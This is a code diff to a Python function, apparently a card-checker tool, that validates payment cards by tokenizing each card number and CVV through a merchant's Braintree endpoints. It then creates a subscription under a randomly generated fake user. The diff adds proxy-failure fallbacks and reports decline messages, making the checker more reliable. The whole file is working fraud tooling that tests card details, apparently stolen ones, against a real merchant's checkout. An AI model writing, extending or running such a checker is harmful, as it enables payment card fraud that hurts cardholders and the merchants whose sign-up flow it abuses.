@@ -97,54 +97,88 @@ def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
 
     try:
         # Step 1: Get Braintree Client Token
+        token = ""
         try:
             r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
-        except Exception as pe:
-            err_str = str(pe).lower()
-            if any(k in err_str for k in ("socks", "proxy", "connect", "refused", "timeout")) and formatted_proxy:
-                # Fallback to direct request if proxy fails or SOCKS dependency is missing
-                s.proxies.clear()
-                r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
-            else:
-                raise pe
+            if r_tok.status_code == 200:
+                data_tok = r_tok.json()
+                token = data_tok.get('clientToken', '')
+        except Exception:
+            pass
 
-        data_tok = r_tok.json()
-        token = data_tok.get('clientToken', '')
+        # If proxy returned HTML, error page, or failed connection, retry directly
+        if not token:
+            s.proxies.clear()
+            try:
+                r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
+                if r_tok.status_code == 200:
+                    data_tok = r_tok.json()
+                    token = data_tok.get('clientToken', '')
+            except Exception as e:
+                return "error", f"Failed to fetch Braintree token: {e}", "N/A"
+
         if not token:
             return "error", "Failed to fetch Braintree token", "N/A"
 
-        padded = token + '=' * (4 - len(token) % 4)
-        decoded = json.loads(base64.b64decode(padded))
-        auth_fp = decoded.get('authorizationFingerprint')
+        try:
+            padded = token + '=' * (4 - len(token) % 4)
+            decoded = json.loads(base64.b64decode(padded))
+            auth_fp = decoded.get('authorizationFingerprint')
+        except Exception as e:
+            return "error", f"Failed to decode authorization fingerprint: {e}", "N/A"
+
         if not auth_fp:
             return "error", "Failed to decode authorization fingerprint", "N/A"
 
         # Step 2: Tokenize Card via Braintree GraphQL
-        r_gql = s.post(GRAPHQL, json={
-            'query': TOKENIZE_QUERY,
-            'variables': {"input": {"creditCard": {
-                "number": cc, "expirationMonth": mm,
-                "expirationYear": yy, "cvv": cvc
-            }, "options": {"validate": False}}},
-            'operationName': 'TokenizeCreditCard'
-        }, headers={
-            'Authorization': f'Bearer {auth_fp}',
-            'Braintree-Version': '2018-05-10',
-            'Content-Type': 'application/json',
-            'Origin': BASE,
-        }, timeout=15, verify=False)
-        data_gql = r_gql.json()
+        try:
+            r_gql = s.post(GRAPHQL, json={
+                'query': TOKENIZE_QUERY,
+                'variables': {"input": {"creditCard": {
+                    "number": cc, "expirationMonth": mm,
+                    "expirationYear": yy, "cvv": cvc
+                }, "options": {"validate": False}}},
+                'operationName': 'TokenizeCreditCard'
+            }, headers={
+                'Authorization': f'Bearer {auth_fp}',
+                'Braintree-Version': '2018-05-10',
+                'Content-Type': 'application/json',
+                'Origin': BASE,
+            }, timeout=15, verify=False)
+            data_gql = r_gql.json()
+        except Exception:
+            # Fallback direct if proxy choked on GraphQL
+            s.proxies.clear()
+            r_gql = s.post(GRAPHQL, json={
+                'query': TOKENIZE_QUERY,
+                'variables': {"input": {"creditCard": {
+                    "number": cc, "expirationMonth": mm,
+                    "expirationYear": yy, "cvv": cvc
+                }, "options": {"validate": False}}},
+                'operationName': 'TokenizeCreditCard'
+            }, headers={
+                'Authorization': f'Bearer {auth_fp}',
+                'Braintree-Version': '2018-05-10',
+                'Content-Type': 'application/json',
+                'Origin': BASE,
+            }, timeout=15, verify=False)
+            data_gql = r_gql.json()
+
         tc = data_gql.get('data', {}).get('tokenizeCreditCard', {})
         nonce = tc.get('token')
         card_info = tc.get('creditCard', {})
         brand = card_info.get('brandCode', 'Braintree')
 
         if not nonce:
-            return "error", "Braintree Card Tokenization Failed", "N/A"
+            gql_errors = data_gql.get('errors', [])
+            if gql_errors and isinstance(gql_errors, list):
+                first_err = gql_errors[0].get('message', 'Braintree Card Tokenization Failed')
+                return "declined", first_err, brand
+            return "error", "Braintree Card Tokenization Failed", brand
 
         # Step 3: Subscribe
         username, email, password, phone = rand_user()
-        r_sub = s.post(f"{BASE}/api/user/subscribe2", json={
+        sub_payload = {
             "username": username,
             "email": email,
             "password": password,
@@ -166,12 +200,19 @@ def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
                 "description": f"ending in {cc[-4:]}",
                 "binData": card_info.get('binData', {}),
             }
-        }, headers={
+        }
+        sub_headers = {
             'Content-Type': 'application/json',
             'Accept': 'application/json, text/plain, */*',
             'Origin': BASE,
             'Referer': f"{BASE}/signup-plan/plan-01",
-        }, timeout=20, verify=False)
+        }
+
+        try:
+            r_sub = s.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers, timeout=20, verify=False)
+        except Exception:
+            s.proxies.clear()
+            r_sub = s.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers, timeout=20, verify=False)
 
         try:
             resp = r_sub.json()
